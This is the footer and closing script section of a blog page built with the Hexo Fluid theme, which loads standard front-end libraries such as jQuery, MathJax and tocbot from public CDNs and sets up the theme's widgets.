    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      æ¡‚ICPå¤‡2022005068å·-1
    </a>
  </span>
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
